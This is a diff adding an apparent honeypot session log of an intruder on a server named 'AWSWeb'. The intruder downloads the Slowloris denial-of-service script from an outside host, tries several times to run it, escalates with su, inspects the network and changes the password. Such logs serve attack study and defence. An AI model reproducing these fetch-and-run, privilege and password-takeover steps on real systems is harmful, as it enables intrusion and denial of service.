@@ -1,0 +1,140 @@
+[4hAWSWeb:~# wget http://www.activestate.com/activeperl/downloads/thank-you?dl=http://downloads.activestate.com/ActivePerl/releases/5.18.2.1802/ActivePerl-5.18.2.1802-x86_64-linux-glibc-2.5-298023.tar.gz
+[4l--2014-04-19 14:37:34--  http://www.activestate.com/activeperl/downloads/thank-you?dl=http://downloads.activestate.com/ActivePerl/releases/5.18.2.1802/ActivePerl-5.18.2.1802-x86_64-linux-glibc-2.5-298023.tar.gz
+Connecting to www.activestate.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html; charset=utf-8]
+Saving to: `thank-you
+
+ 2K [>                                      ] 2,506        7K/s  eta 0s100%[======================================>] 0            7K/s
+
+2014-04-19 14:37:35 (7 KB/s) - `thank-you' saved [54208/0]
+[4hAWSWeb:~# install perl
+bash: install: command not found
+AWSWeb:~# yum install perl
+bash: yum: command not found
+AWSWeb:~# get [1D[1P[1D[1P[1D[1P[1D[1Papt -get install perl
+bash: apt: command not found
+AWSWeb:~# [Kapt -get install perl[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1D[1P
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 419.2kB of archives.
+After this operation, 921.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.32-8 [419.2kB]
+Fetched 419.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.32-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.32-8) ...
+[4hAWSWeb:~# perl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# yum install perl
+bash: yum: command not found
+AWSWeb:~# wget http://ha.ckers.org/slowloris/slowloris.pl
+[4l--2014-04-19 14:40:43--  http://ha.ckers.org/slowloris/slowloris.pl
+Connecting to ha.ckers.org:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18883 (18K) [text/plain; charset=ISO-8859-1]
+Saving to: `slowloris.pl
+
+ 6% [==>                                    ] 1,158        6K/s  eta 2s100%[======================================>] 18,883       6K/s
+
+2014-04-19 14:40:43 (6 KB/s) - `slowloris.pl' saved [18883/18883]
+[4hAWSWeb:~# perl slowloris.pl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# slowloris.pl
+bash: slowloris.pl: command not found
+AWSWeb:~# ./slowloris.pl
+bash: ./slowloris.pl: command not found
+AWSWeb:~# slowloris.pl
+bash: slowloris.pl: command not found
+AWSWeb:~# ls
+[4lthank-you    slowloris.pl 
+[4hAWSWeb:~# 
+AWSWeb:~# ls[1D[1P[1D[1P./slowloris.pl
+bash: ./slowloris.pl: command not found
+AWSWeb:~# pw[1D[1Perl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# chmod 777 thank0[1D[1P-you
+[4l[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# apt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# apt-get install python
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  python 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 512.2kB of archives.
+After this operation, 1126.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main python 1.27-9 [512.2kB]
+Fetched 512.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking python (from .../archives/python_1.27-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up python (1.27-9) ...
+[4hAWSWeb:~# ls
+[4lthank-you    slowloris.pl 
+[4hAWSWeb:~# python.exe
+bash: python.exe: command not found
+AWSWeb:~# ./python.exe
+bash: ./python.exe: command not found
+AWSWeb:~# nohup perl slowloris.pl
+bash: nohup: command not found
+AWSWeb:~# [Knohup perl slowloris.pl[23D[K-w[1D[1Pqa |less[1D[1D[1D[1D[1D [1D[1P[1C 
+bash: -qa: command not found
+AWSWeb:~# rpm -qa | less
+bash: rpm: command not found
+AWSWeb:~# dpkg --get-selections
+bash: dpkg: command not found
+AWSWeb:~# sudo dpkg --get-selections
+bash: sudo: command not found
+AWSWeb:~# su
+[4l[4hAWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# cls
+bash: cls: command not found
+AWSWeb:~# clear
+[4lc[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# su
+[4l[4hAWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:~# clear
+[4lc[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
